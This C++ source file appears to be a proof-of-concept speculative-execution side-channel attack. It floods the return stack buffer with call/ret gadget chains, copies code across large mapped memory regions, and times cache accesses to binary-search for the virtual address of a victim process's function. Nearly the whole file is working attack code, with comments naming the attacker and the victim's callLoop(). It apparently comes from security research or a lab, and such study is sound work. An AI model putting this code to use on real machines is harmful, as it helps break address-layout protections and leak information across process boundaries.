#include "util.hpp"
#include <iostream>
#include <fstream>
#define magicNumber 123*256
#define maxCopyLength 128
#define iterations 1000

using namespace std;

char array[256*256];
void *loadMemoryPtr;

#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $13,%0;" "push %0;" "clflush (%%rsp);" "cpuid;" "ret;"

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	clflush((void *)addr);
}

int checkForMisspeculation() {
	ADDR_PTR tmp;
	int total = 0;

	for (int i = 0; i < iterations; i++) {
		sched_yield();
		asm(
			retAsm( 1)
			retAsm( 2)
			retAsm( 3)
			retAsm( 4)
			retAsm( 5)
			retAsm( 6)
			retAsm( 7)
			retAsm( 8)
			retAsm( 9)
			retAsm(10)
			retAsm(11)
			retAsm(12)
			retAsm(13)
			retAsm(14)
			retAsm(15)
			retAsm(16)
			: "=r" (tmp)
			: 
		);
	
		total += measure_one_block_access_time((ADDR_PTR)&array[magicNumber]);
		clflush((void *)&array[magicNumber]);
	}

	// printf("%f\n", total/10000.0);
	return total/iterations;
}

void loadMemory() { // this should be at the same VA as victim's callLoop()
	asm(
		".rept 115;"
		"nop;"
		".endr;"
		"mov $0x55555575db40, %%rax;"
		"mov (%%rax),%%rax;"
		: : : "rax"
	);
}

int doSearch(ADDR_PTR low, ADDR_PTR high) {
	size_t difference = (ADDR_PTR)high - (ADDR_PTR)low;
	fflush(stdout);

	int copyLength = maxCopyLength;
	while (copyLength > difference) {
		copyLength /= 2;
	}

	for (ADDR_PTR i = low; i < high; i += copyLength) {
		memcpy((void*)i, (void *)((ADDR_PTR)loadMemoryPtr+maxCopyLength-copyLength), copyLength);
	}

	int result = checkForMisspeculation();
	memset((void *)low, 0, difference);

	return result;
}

ADDR_PTR search(ADDR_PTR low, ADDR_PTR high) {
	ADDR_PTR midpoint = (low + high) / 2;
	size_t difference = (ADDR_PTR)high - (ADDR_PTR)low;

	if (difference <= 64) {
		printf("Victim function is between virtual addresses %p and %p.\n", (void *)low, (void *)high);
		return doSearch(low, high);
	}

	int timeLow, timeHigh, timeDiff = 0;
	while(timeDiff < 50) {
		timeLow = doSearch(low, midpoint);
		timeHigh = doSearch(midpoint, high);
		timeDiff = abs(timeLow - timeHigh);
	}


	if (timeLow < timeHigh) {
		return search(low, midpoint);
	} else {
		return search(midpoint, high);
	}
}

void lastFunction();

int main(int argc, char *argv[]){
	void *requestedAddr = (void *)(ADDR_PTR(&lastFunction) + (1<<12));

	printf("requesting memory at %p\n", requestedAddr);
	void *startAddr = largeMap(requestedAddr);
	printf("starting address is %p\n", startAddr);
	void *endAddr = (void *)((ADDR_PTR)startAddr + (largeMapSize));
	printf("ending address is %p\n", endAddr);

	if (((ADDR_PTR)startAddr - (ADDR_PTR)requestedAddr) > 10000) {
		printf("not given requested address!\n");
		return 1;
	}

	loadMemoryPtr = (void *)((ADDR_PTR)&loadMemory+4);

	search(ADDR_PTR(startAddr), ADDR_PTR(endAddr));

	return 0;
}

void lastFunction() {
	// End of code segment. Since Attacker doesn't use ASLR, this is close to 0.
	// Fill lots of memory after this point.
}